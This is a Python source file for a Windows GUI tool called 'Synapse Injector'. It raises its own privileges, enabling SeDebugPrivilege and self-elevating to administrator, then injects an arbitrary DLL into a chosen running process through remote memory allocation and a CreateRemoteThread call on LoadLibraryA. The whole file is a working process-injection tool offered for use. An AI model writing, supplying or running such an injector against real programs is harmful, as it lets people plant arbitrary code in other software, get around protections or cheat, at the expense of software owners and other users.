import sys
import os
import ctypes
from ctypes import wintypes
import psutil
from typing import List, Dict
import tkinter as tk
from tkinter import ttk, filedialog, font
from datetime import datetime

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
MEM_RELEASE = 0x8000

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
kernel32.GetProcAddress.restype = wintypes.LPVOID
kernel32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]
kernel32.GetModuleHandleA.restype = wintypes.HMODULE
kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.VirtualFreeEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]
kernel32.VirtualFreeEx.restype = wintypes.BOOL

class DLLInjector:
    def __init__(self):
        self.enable_debug_privilege()

    def enable_debug_privilege(self):
        try:
            TOKEN_ADJUST_PRIVILEGES = 0x20
            TOKEN_QUERY = 0x8
            SE_PRIVILEGE_ENABLED = 0x2
            advapi32 = ctypes.windll.advapi32

            class LUID(ctypes.Structure):
                _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES)]

            token = wintypes.HANDLE()
            if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(token)):
                return False

            luid = LUID()
            if not advapi32.LookupPrivilegeValueA(None, b"SeDebugPrivilege", ctypes.byref(luid)):
                kernel32.CloseHandle(token)
                return False

            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Privileges.Luid = luid
            tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED

            if not advapi32.AdjustTokenPrivileges(token, False, ctypes.byref(tp), 0, None, None):
                kernel32.CloseHandle(token)
                return False

            kernel32.CloseHandle(token)
            return True
        except Exception:
            return False

    def get_processes(self) -> List[Dict]:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                processes.append({'pid': proc.info['pid'], 'name': proc.info['name']})
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return processes

    def inject_dll(self, process_name: str, dll_path: str) -> tuple[bool, str]:
        if not os.path.exists(dll_path):
            return False, f"DLL file not found: {dll_path}"

        dll_path = os.path.abspath(dll_path)

        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == process_name.lower():
                    target_pid = proc.info['pid']
                    break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if not target_pid:
            return False, f"Process '{process_name}' not found"

        process_handle = None
        allocated_memory = None
        thread_handle = None

        try:
            process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
            if not process_handle:
                return False, f"Failed to open process {target_pid}. Error: {ctypes.get_last_error()}"

            dll_path_bytes = dll_path.encode('utf-8')
            size = len(dll_path_bytes) + 1

            allocated_memory = kernel32.VirtualAllocEx(process_handle, None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
            if not allocated_memory:
                return False, f"Failed to allocate memory in process {target_pid}"

            bytes_written = ctypes.c_size_t(0)
            if not kernel32.WriteProcessMemory(process_handle, allocated_memory, dll_path_bytes, size, ctypes.byref(bytes_written)):
                return False, f"Failed to write to process memory. Error: {ctypes.get_last_error()}"

            kernel32_handle = kernel32.GetModuleHandleA(b"kernel32.dll")
            load_library_addr = kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryA")
            if not load_library_addr:
                return False, "Failed to get LoadLibraryA address"

            thread_handle = kernel32.CreateRemoteThread(process_handle, None, 0, load_library_addr, allocated_memory, 0, None)
            if not thread_handle:
                return False, f"Failed to create remote thread. Error: {ctypes.get_last_error()}"

            kernel32.WaitForSingleObject(thread_handle, 5000)
            return True, f"Successfully injected DLL into process '{process_name}' (PID: {target_pid})"

        except Exception as e:
            return False, f"Error during injection: {str(e)}"
        finally:
            if allocated_memory and process_handle:
                kernel32.VirtualFreeEx(process_handle, allocated_memory, 0, MEM_RELEASE)
            if thread_handle:
                kernel32.CloseHandle(thread_handle)
            if process_handle:
                kernel32.CloseHandle(process_handle)

class SynapseInjectorGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.injector = DLLInjector()
        self.all_process_names = []
        
        self.setup_dpi_awareness()
        self.apply_dark_theme()
        self.init_ui()
        
        self.refresh_processes()
        
    def setup_dpi_awareness(self):
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2) 
        except Exception:
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except:
                pass

    def init_ui(self):
        self.title("Synapse Injector")
        self.geometry("640x480")
        self.resizable(False, False)
        
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        main_frame = ttk.Frame(self, padding="15 15 15 15")
        main_frame.grid(row=0, column=0, sticky="nsew")
        main_frame.grid_rowconfigure(5, weight=1)
        main_frame.grid_columnconfigure(1, weight=1)

        title_font = font.Font(family="Segoe UI", size=18, weight="bold")
        title_label = ttk.Label(main_frame, text="Synapse Injector", font=title_font, anchor="center")
        title_label.grid(row=0, column=0, columnspan=3, sticky="ew", pady=(0, 15), ipady=10)
        self.title_separator = ttk.Separator(main_frame, orient='horizontal')
        self.title_separator.grid(row=0, column=0, columnspan=3, sticky='sew', pady=(0, 15))

        ttk.Label(main_frame, text="Target Process:").grid(row=1, column=0, sticky="w", padx=(0, 10))
        self.process_combo = ttk.Combobox(main_frame)
        self.process_combo.grid(row=1, column=1, sticky="ew")
        self.process_combo.bind('<KeyRelease>', self.filter_processes)
        
        refresh_btn = ttk.Button(main_frame, text="Refresh", command=self.refresh_processes, width=10)
        refresh_btn.grid(row=1, column=2, sticky="e", padx=(10, 0))
        
        ttk.Label(main_frame, text="DLL Path:").grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(0, 10))
        self.dll_path_input = ttk.Entry(main_frame)
        self.dll_path_input.grid(row=2, column=1, sticky="ew", pady=(10, 0))
        browse_btn = ttk.Button(main_frame, text="Browse", command=self.browse_dll, width=10)
        browse_btn.grid(row=2, column=2, sticky="e", pady=(10, 0), padx=(10, 0))
        
        self.inject_btn = ttk.Button(main_frame, text="INJECT DLL", command=self.inject, style="Accent.TButton")
        self.inject_btn.grid(row=3, column=0, columnspan=3, sticky="ew", pady=(15, 10), ipady=8)
        
        ttk.Label(main_frame, text="Console Output:").grid(row=4, column=0, columnspan=3, sticky="w", pady=(5, 5))
        console_frame = ttk.Frame(main_frame, style='Console.TFrame')
        console_frame.grid(row=5, column=0, columnspan=3, sticky="nsew")
        console_frame.grid_rowconfigure(0, weight=1)
        console_frame.grid_columnconfigure(0, weight=1)
        
        self.console = tk.Text(console_frame, wrap=tk.WORD, bd=0, highlightthickness=0)
        self.console.grid(row=0, column=0, sticky="nsew", padx=1, pady=1)
        
        console_scroll = ttk.Scrollbar(console_frame, orient="vertical", command=self.console.yview)
        console_scroll.grid(row=0, column=1, sticky="ns")
        self.console.config(yscrollcommand=console_scroll.set)
        
        self.status_bar = ttk.Label(self, text="Ready", anchor="w", padding="5 2 5 2", style="Status.TLabel")
        self.status_bar.grid(row=1, column=0, sticky="ew")
        
        self.log_message("Synapse Injector initialized. Ready to inject.")

    def apply_dark_theme(self):
        try:
            hwnd = self.winfo_id()
            DWMWA_USE_IMMERSIVE_DARK_MODE = 20
            value = ctypes.c_int(1)
            ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, DWMWA_USE_IMMERSIVE_DARK_MODE, ctypes.byref(value), ctypes.sizeof(value))
        except Exception:
            pass

        BG_COLOR = '#1e1e1e'
        FG_COLOR = '#e0e0e0'
        BORDER_COLOR = '#3a3a3a'
        WIDGET_BG = '#2d2d2d'
        WIDGET_FG = '#cccccc'
        HIGHLIGHT_COLOR = '#2a82da'
        ACCENT_COLOR = '#3a92ea'
        SELECT_BG = '#0078d7'
        STATUS_BG = '#0078d7'

        style = ttk.Style(self)
        style.theme_use('clam')

        style.configure('.', background=BG_COLOR, foreground=FG_COLOR, fieldbackground=WIDGET_BG, borderwidth=1, font=('Segoe UI', 10))
        style.configure('TFrame', background=BG_COLOR)
        style.configure('TLabel', background=BG_COLOR, foreground=FG_COLOR)
        style.configure('TSeparator', background=HIGHLIGHT_COLOR)
        style.configure('Status.TLabel', background=STATUS_BG, foreground='white')

        style.configure('TButton', background=WIDGET_BG, foreground=FG_COLOR, bordercolor=BORDER_COLOR, lightcolor=WIDGET_BG, darkcolor=WIDGET_BG)
        style.map('TButton', background=[('active', BORDER_COLOR), ('pressed', WIDGET_BG)])

        style.configure('Accent.TButton', font=('Segoe UI', 11, 'bold'), background=HIGHLIGHT_COLOR, foreground='white', borderwidth=0)
        style.map('Accent.TButton', background=[('active', ACCENT_COLOR), ('disabled', '#404040')], foreground=[('disabled', '#808080')])

        style.configure('TEntry', fieldbackground=WIDGET_BG, foreground=WIDGET_FG, bordercolor=BORDER_COLOR, insertcolor=FG_COLOR)
        style.map('TEntry', bordercolor=[('focus', HIGHLIGHT_COLOR)])
        
        style.configure('TCombobox', fieldbackground=WIDGET_BG, foreground=WIDGET_FG, bordercolor=BORDER_COLOR, arrowcolor=FG_COLOR, selectbackground=SELECT_BG, selectforeground='white')
        style.map('TCombobox', bordercolor=[('focus', HIGHLIGHT_COLOR)], fieldbackground=[('readonly', WIDGET_BG)])
        self.option_add('*TCombobox*Listbox.background', WIDGET_BG)
        self.option_add('*TCombobox*Listbox.foreground', WIDGET_FG)
        self.option_add('*TCombobox*Listbox.selectBackground', SELECT_BG)
        self.option_add('*TCombobox*Listbox.selectForeground', 'white')

        style.configure('TScrollbar', troughcolor=BG_COLOR, background=WIDGET_BG, bordercolor=BG_COLOR, arrowcolor=FG_COLOR)
        style.map('TScrollbar', background=[('active', BORDER_COLOR)])

        self.configure(bg=BG_COLOR)
        style.configure('Console.TFrame', background=BORDER_COLOR)

    def refresh_processes(self):
        try:
            self.processes = self.injector.get_processes()
            self.all_process_names = sorted({p['name'] for p in self.processes}, key=str.lower)
            self.filter_processes()
            self.status_bar.config(text=f"Found {len(self.all_process_names)} processes")
        except Exception as e:
            self.log_message(f"Error refreshing processes: {e}")
        finally:
            self.after(5000, self.refresh_processes)

    def filter_processes(self, event=None):
        search_term = self.process_combo.get().lower()
        if not search_term:
            self.process_combo['values'] = self.all_process_names
        else:
            filtered_list = [name for name in self.all_process_names if search_term in name.lower()]
            self.process_combo['values'] = filtered_list

    def browse_dll(self):
        file_path = filedialog.askopenfilename(title="Select DLL File", filetypes=(("DLL Files", "*.dll"), ("All Files", "*.*")))
        if file_path:
            self.dll_path_input.delete(0, tk.END)
            self.dll_path_input.insert(0, file_path)

    def inject(self):
        process_name = self.process_combo.get().strip()
        dll_path = self.dll_path_input.get().strip()

        if not process_name:
            self.log_message("Error: Please select or enter a process name.")
            return
        if not dll_path:
            self.log_message("Error: Please specify a DLL path.")
            return
        
        self.log_message(f"Attempting to inject {dll_path} into {process_name}...")
        self.status_bar.config(text="Injecting...")
        self.inject_btn.config(state="disabled")
        self.update_idletasks()

        success, message = self.injector.inject_dll(process_name, dll_path)
        
        if success:
            self.log_message(f"SUCCESS: {message}")
            self.status_bar.config(text="Injection successful")
        else:
            self.log_message(f"ERROR: {message}")
            self.status_bar.config(text="Injection failed")
            
        self.inject_btn.config(state="normal")

    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.config(state="normal")
        self.console.insert(tk.END, f"[{timestamp}] {message}\n")
        self.console.config(state="disabled")
        self.console.see(tk.END)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    
    app = SynapseInjectorGUI()
    app.mainloop()